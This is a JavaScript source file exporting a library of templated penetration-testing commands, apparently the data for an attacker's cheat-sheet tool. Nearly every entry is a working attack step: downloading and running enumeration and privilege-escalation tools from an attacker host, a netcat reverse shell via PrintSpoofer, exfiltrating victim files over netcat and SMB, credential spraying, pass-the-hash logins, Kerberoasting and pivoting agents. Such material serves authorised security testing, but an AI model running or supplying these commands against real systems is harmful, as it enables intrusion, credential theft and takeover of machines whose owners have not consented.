export var commands = {
    "gen": {
        "Basic Full TCP Port nmap": "nmap -v -sT -sC -sV -Pn -sV -p- {{RHOST}} -o nmap.txt",
        "Basic UDP Port nmap": "nmap -v -sU -sC -sV -Pn --top-port=20 {{RHOST}} -o nmap_udp.txt",
        "Transfer File to victim (Powershell) ": "iwr http://{{LHOST}}:{{WEBPORT}}/{{LFILE}} -o {{LFILE}}",
        "Download File from victim (Netcat) - CMD ": "nc.exe {{LHOST}} {{LPORT}} -w 3 < {{RFILE}} \nnc -lnvp {{LPORT}} > {{LFILE}}",
        "Python tty": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "Transfer file with SMB - Setup on Kali": "impacket-smbserver -smb2support test . -username rudeus -password greyrat",
        "Transfer file with SMB - transfer to victim": "net use \\\\{{LHOST}}\\test /user:rudeus greyrat\ncopy \\\\192.168.45.247\\test\\{{LFILE}} {{LFILE}}",
        "Transfer file with SMB - transfer from victim": "net use \\\\{{LHOST}}\\test /user:rudeus greyrat\ncopy {{RFILE}} \\\\192.168.45.247\\test"
    },
    "webenum": {
        "Directory Fuzzing Froxbuster": "feroxbuster -u http://{{RHOST}}:{{RPORT}} -x pdf,php,txt"
    },
    "winenum": {
        "Enumerate using Winpeas (Powershell)": "iwr http://{{LHOST}}:{{WEBPORT}}/winpeas64.exe -o /users/public/winpeas.exe\n/users/public/winpeas.exe",
        "Search for Credentials using winpeas": "./winpeas.exe filesinfo fileanalysis windowscreds",
        "Search for files on the system": "Get-ChildItem -Path C:\\Users\\ -Include * -File -Recurse -ErrorAction SilentlyContinue",
        "Enumerate Interesting Services on Windows - CMD WMIC": "wmic service get name,displayname,pathname,startmode |findstr /i /v \"c:\\windows\"",
        "Enumerate Interesting Services on Windows - Powershell (not work via network)": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
        "Start Stop Restart Service": "net start/stop/restart <Service Name>",
        "Powershell History": "Get-History\n(Get-PSReadlineOption).HistorySavePath",
        "Scheduled Task - Powershell": "Get-ScheduledTask | Format-Table TaskName,URI",
        "Scheduled Task - CMD (The URI in Powershell is the TaskName in schtasks)": "schtasks /query /V /FO LIST /TN <URI_FROM_PWSH>",
        "Scheduled Task - CMD ALL": "schtasks /query /fo LIST /v"

    },
    "winnetexec": {
        "Netexec SMB - single domain credentials": "netexec smb {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec SMB - single domain hash": "netexec smb {{RHOST}} -u {{USERNAME}} -p {{NTLMHASH}}",
        "Netexec SMB - single local credentials": "netexec smb {{RHOST}} -u {{USERNAME}} -H {{PASSWORD}} --local-auth",
        "Netexec SMB - multiple targets, multiple domain credentials": "netexec smb target.txt -u username.txt -p passwords.txt --continue-on-success",
        "Netexec SMB - multiple targets, multiple domain credentials, no bruteforce": "netexec smb target.txt -u username.txt -p passwords.txt --no-bruteforce --continue-on-success",
        "Netexec WINRM - single domain credentials (see netexec SMB for more combination)": "netexec winrm {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec RDP - single domain credentials (see netexec SMB for more combination)": "netexec rdp {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec MSSQL - single domain credentials (see netexec SMB for more combination)": "netexec mssql {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
    },
    "wincon": {
        "Psexec Connection with password for domain": "impacket-psexec {{DOMAIN}}/{{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Psexec Connection with password for local": "impacket-psexec {{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Psexec Connection with pass the hash for local": "impacket-psexec -hashes 00000000000000000000000000000000:{{NTLMHASH}} {{USERNAME}}@{{RHOST}}",
        "Wmiexec Connection with password for domain": "impacket-wmiexec {{DOMAIN}}/{{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Wmiexec Connection with password for local": "impacket-wmiexec {{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Wmiexec Connection with pass the hash for domain": "impacket-wmiexec -hashes :{{NTLMHASH}} {{DOMAIN}}/{{USERNAME}}@{{RHOST}}",
        "RDP Connection with password for local": "xfreerdp /u:{{USERNAME}} /v:{{RHOST}} /p:{{PASSWORD}}",
        "RDP Connection with password for domain": "xfreerdp /u:{{DOMAIN}}/{{USERNAME}} /v:{{RHOST}} /p:{{PASSWORD}}",
        "RDP Connection with pass the hash for domain": "xfreerdp /u:{{DOMAIN}}/{{USERNAME}} /v:{{RHOST}} /pth:{{NTLMHASH}}",
        "Winrm Connection with password for local": "evil-winrm -i {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Winrm Connection with password for domain": "evil-winrm -i {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN}}",
        "Winrm Connection with pass the hash for domain": "evil-winrm -i {{RHOST}} -u {{USERNAME}} -H {{NTLMHASH}} -d {{DOMAIN}}"
    },
    "winpot": {
        "Printspoofer privesc 1 - Upgrade to netcat shell later": "iwr http://{{LHOST}}:{{WEBPORT}}/PrintSpoofer64.exe -o /users/public/print.exe\n/users/public/print.exe -i -c powershell",
        "Printspoofer privesc 2 - Upgrade to netcat shell later": "iwr http://{{LHOST}}:{{WEBPORT}}/PrintSpoofer64.exe -o /users/public/print.exe\niwr http://{{LHOST}}:{{WEBPORT}}/nc.exe -o /users/public/nc.exe\n/users/public/print.exe -c '/users/public/nc.exe {{LHOST}} {{LPORT}} -e powershell'",
    },
    "linenum": {
        "Run linpeas": "wget http://{{LHOST}}:{{WEBPORT}}/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh\n/tmp/linpeas.sh",
        "Find SUID binaries": "find / -perm -u=s -type f 2>/dev/null",
        "Find Writable Directories": "find / -writable -type d 2>/dev/null",
        "Capabilities Enumeration": "/usr/sbin/getcap -r / 2>/dev/null",
        "Cron Enumeration - 1": "crontab -l",
        "Cron Enumeration - 2": "cat /etc/crontab",
        "Cron Enumeration - 3": "ls -lah /etc/cron*",

    },
    "adattack": {
        "AS-REP Roasting (ASREP)": "impacket-GetNPUsers -dc-ip {{DCIP}}  -request -outputfile hashes.asreproast {{DOMAIN}}/{{USERNAME}}",
        "Kerberoasting (Kerberos)": "impacket-GetUserSPNs -request -dc-ip {{DCIP}} {{DOMAIN}}/{{USERNAME}}",
        "DSYNC Attack": ""
    },
    "ligpivot": {
        "Setup Ligolo on Kali": "sudo ip tuntap add user [your username] mode tun ligolo\nsudo ip link set ligolo up",
        "Start Ligolo": "ligolo-proxy -selfcert 0.0.0.0:11601",
        "Pivot on Linux": "wget http://{{LHOST}}:{{WEBPORT}}/agent -O /tmp/agent\nchmod +x /tmp/agent\n/tmp/agent -connect {{LHOST}}:11601 -ignore-cert",
        "Pivot on Windows (Powershell)": "iwr http://{{LHOST}}:{{WEBPORT}}/ligoloagentx64.exe -o /users/public/agent.exe\n/users/public/agent.exe -connect {{LHOST}}:11601 -ignore-cert",
        "Setup Ligolo for another interface to get access internal port": "sudo ip tuntap add user almounah mode tun ligolo-internal\nsudo ip link set ligolo-internal up\nsudo ip route del 240.0.0.1/32\nsudo ip route add 240.0.0.1/32 dev ligolo-internal",
        "Start Ligolo on Kali with internal interface": "sudo ip route add 240.0.0.1/32 dev ligolo-internal"
    }

}
